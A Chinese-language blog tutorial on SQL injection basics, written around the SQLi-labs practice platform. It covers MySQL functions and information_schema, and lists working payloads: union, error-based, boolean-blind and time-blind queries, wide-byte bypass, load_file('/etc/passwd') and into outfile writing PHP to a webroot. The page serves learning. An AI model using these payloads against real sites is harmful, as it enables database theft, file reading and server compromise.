@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- layout.ejs-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="asdasdasasd">
+    <meta name="author" content="Asensio">
+    <meta name="keyword" content="hexo, hexo theme, A-RSnippet, responsive, bootstrap">
+    <link rel="canonical" href="http://yoursite.com/SQL注入基础知识/">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="A-RSnippet&lt;br&gt;&lt;a href=&#34;https://github.com/huyingjie/hexo-theme-A-RSnippet&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Release-v0.1.0-red.svg&#34;&gt;&lt;/a&gt;" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+    <title>
+        
+        SQL注入基础知识｜Asensio&#39;s Blog
+        
+    </title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css">
+
+    
+      <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+      <link rel="stylesheet" href="/css/highlight.css">
+    
+
+    
+      <script id="dsq-count-scr" src="//hexo-a-rsnippet.disqus.com/count.js" async></script>
+    
+
+
+    
+      <meta name="google-site-verification" content="g5BseDGQ1hWwdbBPJLKNfbC6xNOaM3X4LnKEMAvx_tI" />
+    
+
+    
+
+    
+
+
+    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-38355881-1', 'auto');
+    ga('send', 'pageview');
+</script>
+
+
+
+
+
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+
+    <!-- user customization -->
+    <link rel="stylesheet" href="/css/arsnippet.css">
+    <script src="/js/arsnippet.css.js"></script>
+</head>
+
+<style>
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<header>
+<!--
+  <nav class="navbar navbar-default header-navbar" id="nav-top" data-ispost = "true" data-istags="false" data-ishome = "false" >
+    <div class="container-fluid">
+      <div class="navbar-header page-scroll">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" aria-expanded="false"  data-target="#website_navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <span class="navbar-brand animated pulse">
+          <a class="brand-logo" href="/">
+            A-RSnippet<br><a href="https://github.com/huyingjie/hexo-theme-A-RSnippet" target="_blank"><img src="https://img.shields.io/badge/Release-v0.1.0-red.svg"></a>
+          </a>
+        </span>
+      </div>
+
+      <div class="collapse navbar-collapse" id="website_navbar">
+          <ul class="nav navbar-nav navbar-right">
+              
+                <li>
+                  <a href="/">home</a>
+                </li>
+              
+                <li>
+                  <a href="/tutorial/">Tutorial</a>
+                </li>
+              
+                <li>
+                  <a href="/archives/">archives</a>
+                </li>
+              
+                <li>
+                  <a href="/categories/">categories</a>
+                </li>
+              
+                <li>
+                  <a href="/tags/">tags</a>
+                </li>
+              
+          </ul>
+      </div>
+  </nav>
+-->
+
+  
+    <style>
+       .intro-header {
+          background-image: url('/img/default_bg.png')          
+      }
+    </style>
+
+    <div class="intro-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                    <div class="site-heading">
+                        <a href="/" style="color:white"><h1>Asensio&#39;s Blog</h1></a>
+                        <div class="post-subtitle">asdasdasasd</div>
+                        
+                          <span class="meta">
+                               <span class="meta-item">Author: Asensio</span>
+                               <span class="meta-item">Date: Aug 24, 2017</span>
+                               
+                                 <span class="meta-item">Updated On: May 2, 2018</span>
+                               
+                          </span>
+                          <div class="tags text-center">
+                              Categories: 
+                              <a class="tag" href="/categories/#SQL注入"
+                                 title="SQL注入">SQL注入</a>
+                              
+                          </div>
+                          <div class="tags text-center">
+                              Tags: 
+                              <a class="tag" href="/tags/#SQL注入"
+                                 title="SQL注入">SQL注入</a>
+                              
+                              <a class="tag" href="/tags/#信息安全"
+                                 title="信息安全">信息安全</a>
+                              
+                          </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+  
+</header>
+
+
+<!-- Main Content -->
+<!-- post.ejs -->
+<article>
+    <div class="container">
+      <div class="col-lg-8 col-lg-offset-1 col-sm-9">
+          
+            <div class="text-center"><div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5272bc2a7b3c1ddc" async = "async" ></script>
+</div>
+</div><hr>
+          
+          <!---->
+	 <div style="font-size:18px" class="subscribe">SQL注入基础知识</div><p>
+          <p><a href="http://resources.infosecinstitute.com/tutorial-on-sqli-labs/" target="_blank" rel="noopener">tutorial-on-sqli-labs</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SQLI-LABS is a platform to learn SQLI Following <span class="built_in">labs</span> are covered <span class="keyword">for</span> GET <span class="keyword">and</span> POST scenarios:</span><br><span class="line">   <span class="number">1.</span><span class="function">Error Based <span class="title">Injections</span> <span class="params">(Union Select)</span></span></span><br><span class="line"><span class="function">        String</span></span><br><span class="line"><span class="function">        Intiger</span></span><br><span class="line">   2.Error Based Injections (Double Injection Based)</span><br><span class="line">   <span class="number">3.B</span>LIND Injections: </span><br><span class="line">        i.Boolian Based </span><br><span class="line">        ii.Time Based</span><br><span class="line">   <span class="number">4.U</span>pdate Query Injection.</span><br><span class="line">   <span class="number">5.</span>Insert Query Injections.</span><br><span class="line">   <span class="number">6.</span>Header Injections. <span class="number">1.</span>Referer based. <span class="number">2.U</span>serAgent based. <span class="number">3.</span>Cookie based.</span><br><span class="line">   <span class="number">7.</span>Second Order Injections</span><br><span class="line">   <span class="number">8.B</span>ypassing WAF</span><br><span class="line">        i.Bypassing Blacklist filters Stripping comments Stripping OR &amp; AND  </span><br><span class="line">        ii.Stripping SPACES <span class="keyword">and</span> COMMENTS Stripping UNION &amp; SELECT</span><br><span class="line">        Impidence mismatch</span><br><span class="line">   <span class="number">9.B</span><span class="function">ypass <span class="title">addslashes</span><span class="params">()</span></span></span><br><span class="line">   10.Bypassing mysql_real_escape_string. (under special conditions)</span><br><span class="line">   <span class="number">11.</span>Stacked SQL injections.</span><br><span class="line">   <span class="number">12.</span>Secondary channel extraction</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<h1 id="mysql常用注释"><a href="#mysql常用注释" class="headerlink" title="mysql常用注释"></a>mysql常用注释</h1><p>  –[空格]或者是–+<br>  /<em>…</em>/</p>
+<h1 id="mysql链接符"><a href="#mysql链接符" class="headerlink" title="mysql链接符"></a>mysql链接符</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username='zhangsan' and "ab"="a"+"b";</span><br></pre></td></tr></table></figure>
+<h1 id="mysql中常见函数"><a href="#mysql中常见函数" class="headerlink" title="mysql中常见函数"></a>mysql中常见函数</h1><h2 id="信息函数"><a href="#信息函数" class="headerlink" title="信息函数"></a>信息函数</h2><p>database()，用于获取当前所使用的数据库信息<br>version():返回数据库的版本,等价于@@version<br>user()：返回当前的用户，等价如current_user参数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function">select <span class="title">database</span><span class="params">()</span></span>;</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| security   |</span><br><span class="line">+------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select user();</span><br><span class="line">+----------------+</span><br><span class="line">| user()         |</span><br><span class="line">+----------------+</span><br><span class="line">| root@localhost |</span><br><span class="line">+----------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.01</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select version()</span><br><span class="line">    -&gt; ;</span><br><span class="line">+-------------------------+</span><br><span class="line">| version()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| <span class="number">5.7</span><span class="number">.19</span><span class="number">-0u</span>buntu0<span class="number">.16</span><span class="number">.04</span><span class="number">.1</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br></pre></td></tr></table></figure></p>
+<!--more-->
+<h2 id="常见的功能函数"><a href="#常见的功能函数" class="headerlink" title="常见的功能函数"></a>常见的功能函数</h2><p>load_file():从计算机中载入文件,读取文件中的数据。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users union select 1,load_file('/etc/passwd'),3;</span><br><span class="line">select * from users <span class="keyword">union</span> select <span class="number">1</span>,load_file(<span class="number">0x2F6574632F706173737764</span>),<span class="number">3</span>;  #使用<span class="number">16</span>进制绕过单引号限制</span><br></pre></td></tr></table></figure></p>
+<p>into outfile：写入文件，前提是具有写入权限<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select '&lt;?php phpinfo(); ?&gt;' into outfile '/var/www/html/xxx.php';</span><br><span class="line">select char(60,63,112,104,112,32,112,104,112,105,110,102,111,40,41,59,32,63,62) into outfile '/var/www/html/xxx.php';</span><br></pre></td></tr></table></figure></p>
+<p>concat():返回结果为连接参数产生的字符串。如果其中一个参数为null，则返回值为null。用法如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">concat</span><span class="params">(username,password)</span>from users</span>;</span><br></pre></td></tr></table></figure></p>
+<p>concat_ws():是concat_ws()的特殊形式，第一个参数是分隔符，剩下的参数就是字段名。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">concat_ws</span><span class="params">(<span class="string">','</span>,username,password)</span> from users</span>;</span><br></pre></td></tr></table></figure></p>
+<p>group_concat():用于合并多条记录中的结果。用法如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">group_concat</span><span class="params">(username)</span> from users</span>;</span><br><span class="line"> #返回的就是users表中所有的用户名，并且是作为一条记录返回。</span><br></pre></td></tr></table></figure></p>
+<p>subtring(),substr():用于截断字符串。用法为:substr(str,pos,length)，注意pos是从1开始的。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br></pre></td></tr></table></figure></p>
+<p>ascii():用法返回字符所对应的ascii值。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">ascii</span><span class="params">(<span class="string">'a'</span>)</span></span>;		#<span class="number">97</span></span><br></pre></td></tr></table></figure></p>
+<p>length():返回字符串的长度。如：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length("123456")		#返回6</span><br></pre></td></tr></table></figure></p>
+<p>is(exp1,exp2,exp2):如果exp1的表达式是True，则返回exp2；否则返回exp3。如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">3</span>,<span class="number">-1</span>) #<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">selecrt <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="number">3</span>,<span class="number">-1</span>) #<span class="number">1</span>,<span class="number">2</span>,<span class="number">-1</span></span><br></pre></td></tr></table></figure></p>
+<p>以上就是在进行sql注入工程中常用的函数。当然还存在一些使用的不是很多的函数。</p>
+<pre><code>now():返回当前的系统时间
+hex():返回字符串的16进制
+unhex():反向的hex()的16进制
+@@basedir():反向mysql的安装目录
+@@versin_compile_os:操作系统
+</code></pre><h1 id="mysql数据库元信息"><a href="#mysql数据库元信息" class="headerlink" title="mysql数据库元信息"></a>mysql数据库元信息</h1><p>在mysql中存在information_schema是一个信息数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称<br>和访问权限。在informa_schema中常用的表有:</p>
+<ol>
+<li>information_schema.schemata:存储了mysql中所有的数据库信息，返回的内容与show databases的结果是一样的。</li>
+<li>information_schema.tables:存储了数据库中的表的信息。详细地描述了某个表属于哪个schema，表类型，表引擎。show tables from secuiry的结果就是来自这个表</li>
+<li>information_schema.columns:详细地描述了某张表的所有的列以及每个列的信息。show columns from users的结果就是来自这个表</li>
+</ol>
+<p>下面就是利用以上的3个表来获取数据库的信息。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">select <span class="title">database</span><span class="params">()</span></span>; #查选数据库</span><br><span class="line">select schema_name from information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>  #查询数据库</span><br><span class="line">select table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>;  #查询表</span><br><span class="line">select column_name from information_schema.columns where table_name='users' limit 0,1;  #查询列</span><br></pre></td></tr></table></figure></p>
+<h1 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h1><p>sql注入类型大致可以分为常规的sql注入和sql盲注。sql盲注又可以分为基于时间的盲注和基于网页内容的盲注。<br>关于sql的盲注，网上也有很多的说明，这里也不做过多的解释。关于盲注的概念，有具体的例子就方便进行说明。<br>延时注入中，常用的函数就包括了if()和sleep()函数。基本的sql表达式如下：</p>
+<pre><code>select * from users where id=1 and if(length(user())=14,sleep(3),1);
+select * from users where id=1 and if(mid(user(),1,1)=&apos;r&apos;,sleep(3),1);
+</code></pre><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>关于宽字节注入，可以参考宽字节注入详解。宽字节输入一般是由于网页编码与数据库的编码不匹配造成的。对于宽字节注入，使用%d5或%df绕过<br>mysql常用语句总结</p>
+<h1 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1'</span> order by num #        确定字段长度</span><br><span class="line"><span class="number">1'</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> #  确定字段长度</span><br><span class="line"><span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> # 判断页面中显示的字段</span><br><span class="line"><span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) from information_schema.schemata #显示mysql中所有的数据库</span><br><span class="line"><span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span> group_concat(table_name) from information_schema.tables where table_schame = <span class="string">"dbname"</span>/database()/hex(dbname) #</span><br><span class="line"><span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,column_name from information_schema.columns where table_name=<span class="string">"table_name"</span> limit <span class="number">0</span>,<span class="number">1</span> #</span><br><span class="line"><span class="number">-1'</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">"table_name"</span>/hex(table_name) limit <span class="number">0</span>,<span class="number">1</span> </span><br><span class="line">-1' union select 1,2,3 AND '1'='1     在注释符无法使用的情况下</span><br></pre></td></tr></table></figure>
+<h1 id="双重SQL查选"><a href="#双重SQL查选" class="headerlink" title="双重SQL查选"></a>双重SQL查选</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select concat(0x3a,0x3a,(select database()),0x3a,0x3a);</span><br><span class="line">select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;</span><br><span class="line">select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables;</span><br><span class="line">select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a; #这种sql语句的写法，常用于sql的盲注。得到数据库的信息</span><br><span class="line">select count(*),concat(0x3a,0x3a,(select table_name from information_schema.table where table_schema=database() limi 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a; #得到数据库的表的信息</span><br><span class="line"></span><br><span class="line">利用姿势如下：</span><br><span class="line"><span class="number">1'</span> AND (select <span class="number">1</span> from (select count(*),concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(select table_name from information_schema.table where table_schema=database() limi <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()*<span class="number">2</span>))a from information_schema.tables group by a)b) --+</span><br></pre></td></tr></table></figure>
+<p>这种利用姿势是通过mysql执行sql命令时的报错信息来得到所需要的信息的，在接下来的文章中会对这种写法进行详细地分析。</p>
+<h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' and ascii(substr(select database(),1,1))&gt;99</span><br><span class="line">1' and ascii(substr((select table_name from information_schema.tables limit 0,1),1,1))&gt;90</span><br></pre></td></tr></table></figure>
+<p>bool盲注就是根据sql语句执行返回值是True或False对应的页面内容会发生，来得到信息。</p>
+<h1 id="time盲注"><a href="#time盲注" class="headerlink" title="time盲注"></a>time盲注</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1' AND select if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(10),null) +</span><br><span class="line">1' AND select if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e',sleep(10),null) --+</span><br></pre></td></tr></table></figure>
+<p>上述的2种写法都是等价的，time盲注余常规的sql注入方法不同。time盲注需要一般需要使用到if()和sleep()函数。然后根据页面返回内容的长度，进而知道sleep()函数是否有执行。<br>根据sleep()函数是否执行来得到所需的信息。</p>
+
+          
+            <a href="https://www.patreon.com/arsnippet" target="_blank"><img src="/img/patreon.png" alt="support my work at patron"> <a href="https://discord.gg/CB6CPzq" target="_blank"><img src="/img/discord.png" alt="Join the Discord"></a> <br><br><a href="https://arsnippet.freeflarum.com/" target="_blank"><img src="/img/forum.jpg" alt="support my work at patron"></a>
+          
+          <hr>
+          <ul class="pager">
+              
+              <li class="previous">
+                  <a href="/SQL注入-双查询注入/" data-toggle="tooltip" data-placement="left"
+                     title="SQL注入-Error Based Injections (Double Injection Based)">&larr; Previous Post</a>
+              </li>
+              
+              
+              <li class="next">
+                  <a href="/对称博弈-coin-game/" data-toggle="tooltip" data-placement="top"
+                     title="对称博弈(coin game)">Next Post&rarr;</a>
+              </li>
+              
+          </ul>
+        
+  <br>
+  
+  <!-- disqus start -->
+  <div class="comment">
+    <div id="disqus_thread"  class="disqus-thread"></div>
+      <script>
+      var disqus_shortname = 'hexo-a-rsnippet';
+      
+      var disqus_url = 'http://yoursite.com/SQL注入基础知识/';
+      
+      (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+  <!-- disqus end -->
+  
+
+  
+  </div>
+
+
+        
+  <div class="hidden-xs col-sm-3 toc-col">
+    <div class="toc-wrap">
+        Table of Contents
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql常用注释"><span class="toc-number">1.</span> <span class="toc-text">mysql常用注释</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql链接符"><span class="toc-number">2.</span> <span class="toc-text">mysql链接符</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql中常见函数"><span class="toc-number">3.</span> <span class="toc-text">mysql中常见函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息函数"><span class="toc-number">3.1.</span> <span class="toc-text">信息函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的功能函数"><span class="toc-number">3.2.</span> <span class="toc-text">常见的功能函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql数据库元信息"><span class="toc-number">4.</span> <span class="toc-text">mysql数据库元信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入类型"><span class="toc-number">5.</span> <span class="toc-text">sql注入类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#宽字节注入"><span class="toc-number">6.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常规注入"><span class="toc-number">7.</span> <span class="toc-text">常规注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#双重SQL查选"><span class="toc-number">8.</span> <span class="toc-text">双重SQL查选</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bool盲注"><span class="toc-number">9.</span> <span class="toc-text">bool盲注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#time盲注"><span class="toc-number">10.</span> <span class="toc-text">time盲注</span></a></li></ol>
+        
+    </div>
+  </div>
+
+
+      </div>
+  </div>
+</article>
+
+<!-- Footer -->
+<!-- footer.ejs -->
+<footer>
+    <div class="text-center">
+      <ul class="list-inline">
+          
+              <li>
+                  <a href="/atom.xml" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+          
+
+          
+              <li>
+                  <a target="_blank" href="http://weibo.com/u/2911633817">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+              <li>
+                  <a target="_blank"  href="https://github.com/asensioatgithub">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+              <li>
+                  <a href="mailto:emilsinclair@163.com" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+      </ul>
+     <div class="text-muted copyright">
+            &copy;
+            
+            2017 - 2018
+            
+            
+              <i class="fa fa-heart"></i>
+            
+            Asensio
+        <br>
+          
+              Powered by <a target="_blank" href="https://hexo.io">Hexo</a>
+          
+          
+            |
+          
+          
+              Theme - <a href="https://github.com/huyingjie/hexo-theme-A-RSnippet" target="_blank">A-RSnippet</a> v0.1.0
+          
+          
+      </div>
+    </div>
+</footer>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+</body>
+
+</html>
